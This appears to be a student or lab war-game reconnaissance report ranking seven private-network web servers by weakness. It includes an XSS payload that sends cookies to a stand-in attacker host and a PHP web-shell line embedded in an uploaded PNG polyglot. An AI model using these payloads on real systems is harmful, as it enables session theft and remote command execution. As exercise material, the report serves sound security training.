# Security Assessment Report — War Game Reconnaissance

**Date:** March 14, 2026
**Assessed by:** Team 10

---

## Active VMs on 10.96.1.x

| IP | Port 80 | Port 443 | Status |
|---|---|---|---|
| 10.96.1.52 | 301 (→HTTPS) | 302 | Fully deployed |
| 10.96.1.69 | 200 | - | HTTP only |
| 10.96.1.107 | 301 (→HTTPS) | 200 | Fully deployed |
| 10.96.1.160 | 301 (→HTTPS) | 200 | Fully deployed |
| 10.96.1.245 | - | - | Our VM |
| 10.96.1.250 | 200 | - | HTTP only |
| 10.96.1.253 | 301 (→HTTPS) | 200 | Fully deployed |

---

## Vulnerability Report

### 10.96.1.69 (HTTP only) — WEAKEST TARGET

| # | Severity | Vulnerability | Proof |
|---|---|---|---|
| 1 | **CRITICAL** | **Reflected XSS on search** | `<script>alert(1)</script>` reflected without encoding |
| 2 | **HIGH** | **No HTTPS** | All traffic including session cookies sent in cleartext |
| 3 | **HIGH** | **No rate limiting** | 10 failed logins with no lockout or blocking |
| 4 | **HIGH** | **Missing ALL security headers** | No CSP, no X-Frame-Options, no HSTS, no X-Content-Type-Options |
| 5 | **MEDIUM** | **Server info leaked** | `Server: nginx/1.24.0`, `X-Powered-By: PHP/8.2.30` |
| 6 | **MEDIUM** | **Cookie missing Secure flag** | Session cookie sent over HTTP without Secure flag |
| 7 | **LOW** | **.git/.env return 403** | Confirms existence of source control and env files |

**Attack vectors:**
- Steal session cookies via XSS: `<script>fetch('http://attacker/steal?c='+document.cookie)</script>`
- Brute force any account (no rate limiting)
- Session hijacking via network sniffing (no HTTPS)
- Clickjacking (no X-Frame-Options)

---

### 10.96.1.250 (HTTP only)

| # | Severity | Vulnerability | Proof |
|---|---|---|---|
| 1 | **HIGH** | **No HTTPS** | All traffic in cleartext, session cookies sniffable |
| 2 | **MEDIUM** | **config.php accessible (HTTP 200)** | Returns empty (PHP executed) but confirms file exists |
| 3 | **MEDIUM** | **Server info leaked** | `Server: nginx/1.24.0` |
| 4 | **LOW** | **.git, .env, README.md, composer.json return 403** | Confirms existence of these files |

**What's secure:**
- Has CSP, X-Frame-Options, X-Content-Type-Options headers
- XSS blocked (output encoding works)
- Rate limiting works (locked after 5-6 attempts)
- SQL injection blocked

---

### 10.96.1.52 (HTTPS)

| # | Severity | Vulnerability | Proof |
|---|---|---|---|
| 1 | **CRITICAL** | **Polyglot PNG upload — no image re-encoding** | Uploaded PNG with embedded `<?php system($_GET["cmd"]); ?>` — payload survives in served image, no GD re-encoding performed |
| 2 | **HIGH** | **No rate limiting** | 10 failed logins with no lockout |
| 3 | **HIGH** | **Missing ALL security headers** | No CSP, no X-Frame-Options, no HSTS, no X-Content-Type-Options |
| 4 | **MEDIUM** | **SameSite=Lax (not Strict)** | Weaker CSRF protection, allows GET-based cross-site requests |
| 5 | **MEDIUM** | **Server/PHP version leaked** | `Apache/2.4.66`, `PHP/8.2.30` |

**Attack vectors:**
- **Polyglot PNG upload**: Embed PHP code inside valid PNG, upload as profile image. Server stores without re-encoding — PHP payload persists in served file. If combined with LFI or misconfigured handler, achieves RCE.
- Brute force any account password (no rate limiting)
- Clickjacking via iframe (no X-Frame-Options)
- MIME sniffing attacks (no X-Content-Type-Options)

---

### 10.96.1.107 (HTTPS) — WELL SECURED

| # | Severity | Vulnerability | Proof |
|---|---|---|---|
| - | - | **No significant vulnerabilities found** | - |

**Security features:**
- CSP with nonces (strongest CSP implementation seen)
- HSTS with preload
- Custom session name (`__Secure-ID`)
- HttpOnly + Secure + SameSite=Strict cookies
- All security headers present

---

### 10.96.1.160 (HTTPS)

| # | Severity | Vulnerability | Proof |
|---|---|---|---|
| 1 | **MEDIUM** | **`unsafe-inline` in script-src CSP** | Allows inline JS execution if any XSS vector exists |
| 2 | **MEDIUM** | **Cookie missing Secure and HttpOnly flags** | `SameSite=Lax` only |
| 3 | **LOW** | **`page=` parameter in URL** | Potential LFI vector (`index.php?page=login`), didn't succeed but suspicious |

**Attack vectors:**
- If XSS is found, `unsafe-inline` in CSP won't block it
- Cookie can be stolen via JS (no HttpOnly)

---

### 10.96.1.253 (HTTPS) — WELL SECURED

| # | Severity | Vulnerability | Proof |
|---|---|---|---|
| - | - | **No significant vulnerabilities found** | - |

**Security features:**
- Strict CSP (no unsafe-inline)
- HSTS with preload
- HttpOnly + Secure + SameSite=Strict cookies
- Server header stripped to just `Apache` (no version)
- All security headers present

---

## Priority Attack Targets for War Game

1. **10.96.1.69** — CRITICAL XSS, no rate limiting, no headers, no HTTPS
2. **10.96.1.52** — CRITICAL polyglot PNG upload, no rate limiting, no security headers
3. **10.96.1.160** — Weak CSP, cookie flags missing
4. **10.96.1.250** — No HTTPS but otherwise decent security
5. **10.96.1.107** — Very hard to attack
6. **10.96.1.253** — Very hard to attack
